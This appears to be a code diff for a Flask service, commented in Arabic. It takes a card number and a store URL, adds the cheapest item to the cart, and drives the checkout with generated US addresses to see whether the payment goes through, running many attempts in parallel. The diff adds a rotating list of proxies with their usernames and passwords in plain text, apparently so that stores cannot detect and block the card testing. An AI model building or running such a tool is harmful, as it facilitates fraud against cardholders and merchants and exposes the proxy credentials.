@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية + بروكسيات متعددة
 import time
 import re
 import json
@@ -18,24 +18,65 @@ import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 import random
-from user_agent import *
-usser=generate_user_agent()
+
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 10  # عدد الطلبات المتوازية اللي تشتغل بنفس الوقت
-REQUEST_TIMEOUT = 100
+MAX_WORKERS = 10
+REQUEST_TIMEOUT = 60
 TASK_QUEUE = queue.Queue()
 
-# منفذ العمليات المتوازية - هذا اللي يخلي الطلبات تشتغل بنفس الوقت
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# عداد لتتبع الطلبات النشطة
 active_tasks = {}
 active_tasks_lock = threading.Lock()
+
+# ==================== قائمة البروكسيات ====================
+PROXY_LIST = [
+    "207273:YXn4KChV@192.144.26.139:8800",
+    "207273:YXn4KChV@177.234.142.34:8800",
+    "207273:YXn4KChV@192.144.26.7:8800",
+    "207273:YXn4KChV@192.144.26.182:8800",
+    "207273:YXn4KChV@177.234.142.110:8800",
+    "207274:bv5KcH7JVR@38.154.127.188:8800",
+    "207274:bv5KcH7JVR@38.154.127.189:8800",
+    "207274:bv5KcH7JVR@192.186.190.226:8800",
+    "207274:bv5KcH7JVR@38.154.127.233:8800",
+    "207274:bv5KcH7JVR@192.186.190.229:8800",
+    "207274:bv5KcH7JVR@192.186.190.236:8800",
+    "207274:bv5KcH7JVR@192.186.190.252:8800",
+    "207274:bv5KcH7JVR@38.154.127.208:8800",
+    "207274:bv5KcH7JVR@38.154.127.214:8800",
+    "207274:bv5KcH7JVR@192.186.190.225:8800",
+    "207276:gFuY3QqABfF@107.175.80.4:8800",
+    "207276:gFuY3QqABfF@107.175.92.196:8800",
+    "207276:gFuY3QqABfF@107.175.92.245:8800",
+    "207276:gFuY3QqABfF@107.175.92.197:8800",
+    "207276:gFuY3QqABfF@107.175.80.43:8800",
+    "207276:gFuY3QqABfF@107.175.80.2:8800",
+    "207276:gFuY3QqABfF@107.175.80.1:8800",
+    "207276:gFuY3QqABfF@107.175.92.244:8800",
+    "207276:gFuY3QqABfF@107.175.80.54:8800",
+    "207276:gFuY3QqABfF@107.175.92.242:8800",
+    "207295:hwst5RWh4@195.242.209.13:8800",
+    "207295:hwst5RWh4@195.242.209.223:8800",
+    "207295:hwst5RWh4@167.160.171.193:8800",
+    "207295:hwst5RWh4@167.160.171.51:8800",
+    "207295:hwst5RWh4@195.242.209.205:8800",
+    "207295:hwst5RWh4@167.160.171.139:8800",
+    "207295:hwst5RWh4@195.242.209.142:8800",
+    "207295:hwst5RWh4@167.160.171.234:8800",
+    "207295:hwst5RWh4@195.242.209.18:8800",
+    "207295:hwst5RWh4@167.160.171.116:8800",
+    "purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780",
+]
+
+def get_random_proxy():
+    """اختيار بروكسي عشوائي من القائمة"""
+    return random.choice(PROXY_LIST)
 
 # ==================== نظام توليد عناوين أمريكية متطابقة ====================
 MATCHED_ADDRESSES = [
@@ -251,15 +292,17 @@ def ff(ccx, site, task_id=None):
     order_number = None
     payment_status = None
     
+    # اختيار بروكسي عشوائي
+    random_proxy = get_random_proxy()
+    logger.info(f"[{task_id}] Using proxy: {random_proxy}")
+    
     # ==================== 1. جلب رابط الدفع ====================
     try:
-        proxy = "px440401.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
-        ip, port, user, pwd = proxy.split(":")
-        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+        proxy_url = f"http://{random_proxy}"
         proxies = {"http": proxy_url, "https": proxy_url}
         
         s = requests.Session()
-        s.headers.update({'User-Agent':usser})
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -306,11 +349,11 @@ def ff(ccx, site, task_id=None):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies,  timeout=100)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, timeout=100)
         if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies,timeout=100)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, timeout=100)
         checkout_url = response.url
         
     except Exception as e:
@@ -675,18 +718,16 @@ def ff(ccx, site, task_id=None):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-             'Economy',
-             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'First', 
-            'by-items', 
-            'Standard', 
-            'Priority', 
-            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'GroundAdvantage', 
-            'MediaMail',
-            'AddressLocalizationKeys'
-           
-             
+                'Economy',
+                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE',
+                'First',
+                'by-items',
+                'Standard',
+                'Priority',
+                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE',
+                'GroundAdvantage',
+                'MediaMail',
+                'AddressLocalizationKeys'
             ]
             
             for attempt in range(10):
@@ -1021,7 +1062,6 @@ def ff(ccx, site, task_id=None):
                     result_code = None
                     result_typename = None
             
-            # تحديث حالة المهمة
             if task_id:
                 with active_tasks_lock:
                     if task_id in active_tasks:
@@ -1039,7 +1079,8 @@ def ff(ccx, site, task_id=None):
                     "checkout_url": checkout_url,
                     "final_url": final_url,
                     "error": None,
-                    "task_id": task_id
+                    "task_id": task_id,
+                    "proxy_used": random_proxy
                 }
             else:
                 return {
@@ -1052,7 +1093,8 @@ def ff(ccx, site, task_id=None):
                     "checkout_url": checkout_url,
                     "final_url": final_url,
                     "error": "Code not found",
-                    "task_id": task_id
+                    "task_id": task_id,
+                    "proxy_used": random_proxy
                 }
         
         except Exception as e:
@@ -1073,7 +1115,8 @@ def ff(ccx, site, task_id=None):
                 "checkout_url": checkout_url,
                 "final_url": None,
                 "error": str(e),
-                "task_id": task_id
+                "task_id": task_id,
+                "proxy_used": random_proxy
             }
     
     except Exception as e:
@@ -1094,7 +1137,8 @@ def ff(ccx, site, task_id=None):
             "checkout_url": checkout_url,
             "final_url": None,
             "error": str(e),
-            "task_id": task_id
+            "task_id": task_id,
+            "proxy_used": random_proxy
         }
 
 # ==================== Routes ====================
@@ -1119,10 +1163,8 @@ def home():
             "error": "Missing cc or url parameters. Use /?cc=CARD&url=SITE"
         })
     
-    # توليد معرف للمهمة
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
     
-    # تنفيذ المهمة في Thread منفصل - هذا يسمح بتنفيذ عدة طلبات بنفس الوقت
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1145,6 +1187,7 @@ def status():
         return jsonify({
             "active_tasks_count": len(active_tasks),
             "max_workers": MAX_WORKERS,
+            "proxy_count": len(PROXY_LIST),
             "tasks": active_tasks
         })
 
@@ -1153,10 +1196,10 @@ def health():
     return jsonify({
         "status": "ok",
         "max_workers": MAX_WORKERS,
-        "active_tasks": len(active_tasks)
+        "active_tasks": len(active_tasks),
+        "proxy_count": len(PROXY_LIST)
     })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    # تشغيل Flask مع دعم threads للتوازي
     app.run(host='0.0.0.0', port=port, threaded=True)
